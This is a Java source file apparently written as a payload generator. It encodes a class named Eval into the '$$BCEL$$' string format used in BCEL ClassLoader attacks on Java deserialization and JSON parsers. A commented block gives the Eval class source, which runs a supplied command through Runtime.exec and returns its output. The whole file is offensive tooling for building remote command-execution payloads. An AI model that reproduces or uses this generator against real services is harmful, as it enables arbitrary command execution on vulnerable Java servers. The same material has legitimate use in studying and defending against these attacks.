package mybcel;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Tobcel {

    public static void main(String[] args) throws Exception{
//        com.sun.org.apache.bcel.internal.classfile.Utility
//            URI url = Tobcel.class.getResource("Eval.class").toURI();
//            System.out.println(Paths.get(url));
//            byte[] bytes = Files.readAllBytes(Paths.get(url));


//            byte[] bytes = ("package mybcel;import java.io.BufferedReader;\n" +
//                    "import java.io.InputStreamReader;\n" +
//                    "\n" +
//                    "public class Eval {\n" +
//                    "    public String as;\n" +
//                    "\n" +
//                    "\n" +
//                    "    public  Eval(String cmd )throws Exception{\n" +
//                    "        StringBuilder stringBuilder =  new StringBuilder();\n" +
//                    "        Process process = Runtime.getRuntime().exec(cmd);\n" +
//                    "        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n" +
//                    "        String a ;\n" +
//                    "        while ((a  = br.readLine() )!= null){\n" +
//                    "            stringBuilder.append(a).append(\"\\n\");\n" +
//                    "        }\n" +
//                    "        this.as  = stringBuilder.toString();\n" +
//                    "\n" +
//                    "//        System.out.println(new Eval(cmd));\n" +
//                    "    }\n" +
//                    "\n" +
//                    "    @Override\n" +
//                    "    public String toString() {\n" +
//                    "        return this.as;\n" +
//                    "    }\n" +
//                    "}\n").getBytes();
            JavaClass cls = Repository.lookupClass(Eval.class);
//            System.out.println(new String(bytes));

            String bcel1 = Utility.encode(cls.getBytes() , true);
            System.out.print("$$BCEL$$"+bcel1);


    }
}
